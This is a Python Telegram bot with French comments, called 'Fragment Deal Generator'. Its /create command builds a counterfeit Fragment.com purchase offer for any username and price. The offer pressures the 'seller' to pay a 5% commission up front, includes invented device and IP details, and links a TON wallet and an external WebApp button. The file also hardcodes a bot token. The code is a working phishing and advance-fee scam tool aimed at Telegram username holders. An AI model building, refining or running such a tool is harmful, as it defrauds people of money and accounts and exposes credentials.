import asyncio
import aiohttp
import sys
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import NetworkError, TimedOut, Conflict

# Configuration simple du logging
import logging
logging.basicConfig(level=logging.WARNING)

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924

print(f"🔍 DEBUG: BOT_TOKEN configuré: ✅")
print(f"🔍 DEBUG: CHAT_ID fixe: {FIXED_CHAT_ID}")

# ===== FONCTION PRIX TON =====
async def get_ton_price():
    """Récupère le prix du TON en USD via l'API DIA"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000", 
                timeout=10
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    return float(data.get('Price', 5.50))
                else:
                    print(f"Erreur API DIA: {response.status}")
                    return 5.50
    except Exception as e:
        print(f"Erreur récupération prix TON: {e}")
        return 5.50

# ===== FONCTION GÉNÉRATION MESSAGE =====
async def generate_fragment_message(username, price):
    """Génère le message Fragment avec calculs en temps réel"""
    try:
        # Calculs
        commission = price * 0.05
        ton_to_usd = await get_ton_price()
        price_usd = price * ton_to_usd
        commission_usd = commission * ton_to_usd
        
        # Message personnalisé
        message = f"""We have received a purchase request for your username @{username.upper()} via Fragment.com. Below are the transaction details:

**• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)**

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)

Important:
**• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message.**"""

        # Bouton vers WebApp
        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={username}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        return message, reply_markup
        
    except Exception as e:
        print(f"Erreur génération message: {e}")
        return None, None

# ===== GESTIONNAIRE D'ERREURS SIMPLE =====
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire d'erreurs simplifié"""
    try:
        error = context.error
        if isinstance(error, Conflict):
            print("❌ Conflit détecté - redémarrage nécessaire")
            os._exit(1)  # Forcer l'arrêt complet
        else:
            print(f"Erreur: {error}")
    except Exception:
        pass

# ===== COMMANDES TELEGRAM =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    try:
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        message = f"""🤖 **Fragment Deal Generator**

Bonjour {user.first_name}! 

📱 **Votre Chat ID:** `{chat_id}`

Ce bot génère automatiquement des messages Fragment personnalisés.

**Commandes disponibles:**
• `/create username price` - Créer un message Fragment
• `/help` - Aide

💎 **Prêt à créer vos deals!**"""
        
        await update.message.reply_text(message, parse_mode='Markdown')
        print(f"✅ Commande /start exécutée pour {user.first_name}")
        
    except Exception as e:
        print(f"Erreur start_command: {e}")

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create username price"""
    try:
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ **Usage:** `/create username price`\n"
                "📝 **Exemple:** `/create crypto 1000`",
                parse_mode='Markdown'
            )
            return
            
        username = context.args[0].strip().lower()
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Format de prix invalide")
            return
        
        if price <= 0:
            await update.message.reply_text("❌ Le prix doit être supérieur à 0")
            return
            
        # Message de génération
        await update.message.reply_text(
            f"⏳ **Génération du deal...**\n"
            f"👤 Username: @{username}\n"
            f"💰 Prix: {price} TON",
            parse_mode='Markdown'
        )
        
        print(f"🔄 Génération deal @{username} - {price} TON")
        
        # Génération du message
        message, reply_markup = await generate_fragment_message(username, price)
        
        if message and reply_markup:
            await update.message.reply_text(
                message,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            
            await update.message.reply_text(
                f"✅ **Deal créé!**\n"
                f"🎯 @{username} - {price} TON",
                parse_mode='Markdown'
            )
            
            print(f"✅ Deal créé: @{username} - {price} TON")
        else:
            await update.message.reply_text("❌ Erreur génération")
            
    except Exception as e:
        print(f"Erreur create_command: {e}")
        try:
            await update.message.reply_text("❌ Erreur système")
        except:
            pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande d'aide"""
    try:
        help_text = """🤖 **Fragment Deal Generator - Aide**

**Commandes:**
• `/start` - Informations
• `/create username price` - Créer un deal
• `/help` - Cette aide

**Exemple:**
`/create crypto 1500`

💎 **Bot prêt!**"""
        
        await update.message.reply_text(help_text, parse_mode='Markdown')
        print("✅ Help affiché")
        
    except Exception as e:
        print(f"Erreur help: {e}")

# ===== FONCTION FORCE STOP =====
async def force_stop_bot():
    """Force l'arrêt des autres instances"""
    try:
        print("🔄 Tentative d'arrêt forcé des autres instances...")
        
        # Création d'une app temporaire pour forcer l'arrêt
        temp_app = Application.builder().token(BOT_TOKEN).build()
        
        try:
            await temp_app.initialize()
            # Essai de récupération d'updates pour déclencher le conflit
            await temp_app.bot.get_updates(timeout=1, limit=1)
            await temp_app.shutdown()
        except Conflict:
            print("✅ Instance précédente arrêtée")
            await asyncio.sleep(3)  # Attendre l'arrêt complet
        except Exception as e:
            print(f"Erreur force_stop: {e}")
        
    except Exception as e:
        print(f"Erreur force_stop_bot: {e}")

# ===== FONCTION PRINCIPALE =====
async def run_bot():
    """Lance le bot de manière asynchrone"""
    try:
        print("🚀 Démarrage Fragment Deal Generator...")
        
        # Force l'arrêt des autres instances
        await force_stop_bot()
        
        # Création de l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout des handlers
        app.add_error_handler(error_handler)
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("create", create_command))
        app.add_handler(CommandHandler("help", help_command))
        
        print("✅ Bot configuré")
        print(f"💎 Chat ID: {FIXED_CHAT_ID}")
        print("🔗 WebApp: BidRequestWebApp_bot/WebApp")
        print("\n📋 Commandes:")
        print("   • /start - Démarrer")
        print("   • /create username price - Créer deal")
        print("   • /help - Aide")
        
        # Initialisation
        await app.initialize()
        await app.start()
        await app.updater.start_polling(
            drop_pending_updates=True,
            allowed_updates=['message']
        )
        
        print("🟢 Bot démarré avec succès!")
        
        # Boucle infinie pour maintenir le bot en vie
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            print("\n🛑 Arrêt demandé")
            
    except Conflict as e:
        print(f"❌ Conflit persistant: {e}")
        print("🔄 Redémarrage dans 5 secondes...")
        await asyncio.sleep(5)
        os._exit(1)  # Force restart
        
    except Exception as e:
        print(f"❌ Erreur critique: {e}")
        os._exit(1)
        
    finally:
        try:
            await app.updater.stop()
            await app.stop()
            await app.shutdown()
            print("🔚 Bot arrêté proprement")
        except:
            pass

# ===== POINT D'ENTRÉE =====
def main():
    """Point d'entrée principal"""
    try:
        # Configuration de la boucle d'événements
        if sys.platform.startswith('win'):
            asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
        
        # Lancement du bot
        asyncio.run(run_bot())
        
    except KeyboardInterrupt:
        print("\n🛑 Arrêt par utilisateur")
        
    except Exception as e:
        print(f"❌ Erreur main: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
